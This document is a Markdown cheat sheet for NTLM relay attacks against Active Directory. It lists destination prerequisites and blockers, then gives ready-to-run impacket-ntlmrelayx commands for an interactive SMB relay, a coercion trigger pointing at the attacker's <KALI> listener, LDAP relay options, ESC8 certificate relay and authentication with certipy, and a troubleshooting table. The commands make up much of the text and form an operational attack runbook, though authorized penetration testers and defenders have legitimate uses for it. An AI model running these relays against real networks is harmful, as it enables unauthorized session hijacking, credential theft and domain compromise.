# NTLM relay

Relay needs a **live** NTLM exchange. A captured NetNTLMv2 response cannot be replayed (crack it, or relay live). Authenticating ≠ rights: the relayed identity still needs rights on the destination.

| Path | Input | Result |
| --- | --- | --- |
| Crack | NetNTLM response | Password |
| Pass the Hash | NT hash | New authentication |
| Relay | Live authentication + suitable destination | Session as the source principal |
| Coercion | Forces a host to connect | Connection only: still needs a relay destination |

## Destination checks
| Destination | Needs | Blocker |
| --- | --- | --- |
| SMB | NTLM accepted, signing not required, rights on share/service | Required signing, NTLM restricted |
| LDAP | NTLM SASL accepted, no required signing, object rights | Required LDAP signing |
| LDAPS | NTLM accepted, no channel binding, object rights | Channel binding |
| AD CS HTTP | Web Enrollment accepts NTLM, no EPA, enrollable template | EPA, NTLM disabled, no template |

- LDAP signing and LDAPS channel binding are separate. `ldaps://` is not a fix; disabled SMB signing says nothing about LDAP.
- Source side: outbound NTLM policy, user vs machine identity, route to the listener.

```bash
nxc smb <FQDN>
curl -I http://<CA-FQDN>/certsrv/
ip route get <SOURCE-IP>
sudo ss -ltnp '( sport = :445 or sport = :80 )'
```
- Responder and `ntlmrelayx` cannot share 445/80: disable Responder's SMB/HTTP servers first.

## SMB relay, interactive
```bash
impacket-ntlmrelayx -h
sudo impacket-ntlmrelayx -t smb://<FQDN> -smb2support -i \
  -ip <KALI> --no-http-server --no-wcf-server --no-raw-server \
  --no-rpc-server --no-winrm-server --no-mssql-server --no-rdp-server
```
Trigger from the source host:
```cmd
dir \\<KALI>\probe
```
Then connect to the local port the relay prints:
```bash
nc 127.0.0.1 <CONSOLE-PORT>
```
```text
shares
use <SHARE>
ls
exit
```
- Without `-i` the default SMB action is a SAM dump. Older releases have fewer `--no-*-server` flags: check `-h`.
- Check the relay log shows the expected source account.

## LDAP relay
Rights = the relayed principal's own. Pick the action from confirmed object rights:
- Group / DACL edits → [object rights](object-rights.md)
- RBCD → [delegation](delegation.md)
- gMSA / LAPS reads → [managed credentials](managed-credentials.md)

- `--no-dump`, `--no-da`, `--no-acl` switch off distinct default actions: check `-h` before launching so a bind-only plan does not edit ACLs.

## AD CS relay (ESC8)
Needs Web Enrollment reachable, NTLM accepted, no EPA, and an authentication-capable template the source account may enroll in.
```bash
certipy relay -h
sudo certipy relay -target http://<CA-FQDN> -template User \
  -interface <KALI> -port 445 -out <USER>-relay
```
```bash
certipy auth -pfx <PFX> -dc-ip <DC-IP> -no-hash -no-save
```
- User, machine and DC accounts need different templates. Do not assume a DC cert from any machine account.
- Issued but auth fails → [adcs](adcs.md) (SID mapping, EKU, PKINIT/Schannel).

## Troubleshooting
| Symptom | Check |
| --- | --- |
| No source connection | Trigger, routing/firewall, listener IP, port in use |
| Wrong identity arrives | User vs service/machine process |
| SMB requires signing | Measured signing: SMB relay not possible, pick another target |
| Auth accepted, action denied | Relayed identity and its rights |
| LDAP `strongerAuthRequired` | LDAP signing / channel binding |
| LDAP/HTTP auth rejected | NTLM restrictions, EPA, negotiate flags |
| Certificate request rejected | Template name, enrollment rights, EKU, approval |
| Certificate issued, auth fails | [adcs](adcs.md) |
